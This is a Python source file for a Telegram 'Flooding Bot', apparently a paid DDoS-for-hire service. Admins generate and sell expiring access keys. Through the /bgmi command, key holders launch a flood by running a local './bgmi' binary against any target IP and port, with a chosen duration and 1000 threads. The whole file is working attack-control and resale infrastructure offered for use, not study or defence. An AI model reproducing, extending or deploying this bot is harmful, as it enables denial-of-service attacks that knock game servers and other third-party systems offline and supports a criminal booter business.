import subprocess
import json
import os
import random
import string
import datetime
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
KEY_FILE = "keys.json"

# Default Attack Parameters
DEFAULT_THREADS = 1000
DEFAULT_PACKET = 9

# Load Data on Start
users = {}
keys = {}

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

async def safe_send_message(update: Update, text: str):
    """Safely send messages and handle errors."""
    try:
        await update.message.reply_text(text)
    except Exception as e:
        print(f"Error sending message: {e}")

# Generate Key Command (Admin Only)
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                expiration_date = add_time_to_current_date(**{time_unit: time_amount})
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"✅ Key generated: `{key}`\n🔹 Expires on: {expiration_date}"
            except ValueError:
                response = "❌ Invalid time format. Use: `/genkey <amount> <hours/days>`"
        else:
            response = "Usage: `/genkey <amount> <hours/days>`"
    else:
        response = "⚠️ ONLY OWNER CAN USE THIS COMMAND."
    
    await safe_send_message(update, response)

# Redeem Key Command
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅ Key redeemed successfully! Access granted until: {users[user_id]}"
        else:
            response = "❌ Invalid or expired key. Buy a key from @OWNER_USERNAME"
    else:
        response = "Usage: `/redeem <key>`"

    await safe_send_message(update, response)

# List All Users (Admin Only)
async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        response = "📋 **Authorized Users:**\n"
        if users:
            for uid, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(uid))
                    username = user_info.username if user_info.username else f"UserID: {uid}"
                    response += f"- @{username} (ID: {uid}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {uid} expires on {expiration_date}\n"
        else:
            response = "⚠️ No users found."
    else:
        response = "⚠️ ONLY OWNER CAN USE THIS COMMAND."

    await safe_send_message(update, response)

# BGMI Attack Command (Restricted Access)
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    # Check if user has access
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await safe_send_message(update, "❌ Access expired or unauthorized. Buy a key from @OWNER_USERNAME")
        return

    if len(context.args) != 4:
        await safe_send_message(update, "Usage: `/bgmi <target_ip> <port> <duration> <sid>`")
        return

    target_ip, port, duration, packet = context.args
    attack_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
    
    try:
        subprocess.Popen(attack_command)
        await safe_send_message(update, f"🚀 **Attack Started** on `{target_ip}:{port}` for {duration} seconds.")
    except Exception as e:
        await safe_send_message(update, f"❌ Failed to start attack: {e}")

# Broadcast Message (Admin Only)
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await safe_send_message(update, "Usage: `/broadcast <message>`")
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=message)
                await asyncio.sleep(0.5)  # Prevent rate limits
            except Exception as e:
                print(f"Error sending message to {user}: {e}")

        response = "📢 Message sent to all users."
    else:
        response = "⚠️ ONLY OWNER CAN USE THIS COMMAND."
    
    await safe_send_message(update, response)

# Help Command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        "**🤖 Welcome to the Flooding Bot**\n"
        f"🔹 **Owner:** @{OWNER_USERNAME}\n\n"
        "**🔑 Admin Commands:**\n"
        "🛠 `/genkey <amount> <hours/days>` - Generate an access key.\n"
        "📜 `/allusers` - Show all authorized users.\n"
        "📢 `/broadcast <message>` - Send a message to all users.\n\n"
        "**🚀 User Commands:**\n"
        "🔑 `/redeem <key>` - Redeem a key for access.\n"
        "🔥 `/bgmi <target_ip> <port> <duration>` - Start attack.\n"
    )
    await safe_send_message(update, response)

# Main Function
def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).read_timeout(30).write_timeout(30).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
